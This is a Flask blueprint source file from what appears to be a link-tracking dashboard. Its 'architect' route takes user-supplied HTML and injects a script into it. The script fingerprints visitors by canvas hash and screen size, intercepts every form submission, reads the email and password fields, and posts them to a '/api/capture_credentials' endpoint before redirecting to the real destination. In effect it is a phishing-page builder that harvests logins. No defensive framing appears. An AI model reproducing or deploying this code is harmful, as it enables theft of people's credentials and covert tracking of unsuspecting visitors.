from flask import Blueprint, render_template, request, redirect, flash, url_for
from flask_login import login_required
import re
import json

from ...models import Link
from ...extensions import db

bp = Blueprint('dashboard_architect', __name__)

@bp.route('/architect')
@login_required
def architect():
    links = Link.query.order_by(Link.created_at.desc()).all()
    return render_template('architect.html', links=links)

@bp.route('/architect/process', methods=['POST'])
@login_required
def architect_process():
    """Process custom HTML with auto-injection."""
    import re
    from flask import jsonify
    
    link_id = request.form.get('link_id')
    custom_html = request.form.get('custom_html')
    auto_inject = request.form.get('auto_inject') == 'true'
    
    if not link_id or not custom_html:
        return jsonify({'error': 'Missing data'}), 400
    
    link = Link.query.get(link_id)
    if not link:
        return jsonify({'error': 'Link not found'}), 404
    
    detected_fields = []
    processed_html = custom_html
    
    if auto_inject:
        if re.search(r'<input[^>]*type=["\']email["\']', custom_html, re.IGNORECASE):
            detected_fields.append('✅ Email input detected')
        if re.search(r'<input[^>]*type=["\']password["\']', custom_html, re.IGNORECASE):
            detected_fields.append('✅ Password input detected')
        if re.search(r'<form', custom_html, re.IGNORECASE):
            detected_fields.append('✅ Form detected')
        
        injection_script = """
<script>
const VISIT_ID = "{{ visit_id }}";
function getCanvasHash() {
    try {
        var canvas = document.createElement('canvas');
        var ctx = canvas.getContext('2d');
        ctx.fillStyle = "#f60";
        ctx.fillRect(125, 1, 62, 20);
        ctx.fillText("ulrTrack", 2, 15);
        return canvas.toDataURL().substring(0, 32);
    } catch(e) { return null; }
}
(function() {
    navigator.sendBeacon('/api/beacon', JSON.stringify({
        visit_id: VISIT_ID,
        canvas_hash: getCanvasHash(),
        screen_res: window.screen.width + 'x' + window.screen.height
    }));
})();
window.addEventListener('DOMContentLoaded', function() {
    document.querySelectorAll('form').forEach(form => {
        form.addEventListener('submit', function(e) {
            e.preventDefault();
            const email = form.querySelector('input[type="email"]')?.value;
            const password = form.querySelector('input[type="password"]')?.value;
            fetch('/api/capture_credentials', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({visit_id: VISIT_ID, email: email, password: password})
            }).then(() => window.location.href = "{{ destination }}")
              .catch(() => window.location.href = "{{ destination }}");
        });
    });
});
</script>
"""
        if '</body>' in processed_html:
            processed_html = processed_html.replace('</body>', injection_script + '</body>', 1)
        elif '</html>' in processed_html:
            processed_html = processed_html.replace('</html>', injection_script + '</html>', 1)
        else:
            processed_html += injection_script
    
    return jsonify({'html': processed_html, 'detected_fields': detected_fields})

@bp.route('/architect/save', methods=['POST'])
@login_required
def architect_save():
    link_id = request.form.get('link_id')
    html = request.form.get('html')
    link = Link.query.get(link_id)
    from flask import jsonify
    if link:
        link.custom_html = html
        db.session.commit()
        return jsonify({'success': True})
    return jsonify({'error': 'Link not found'}), 404

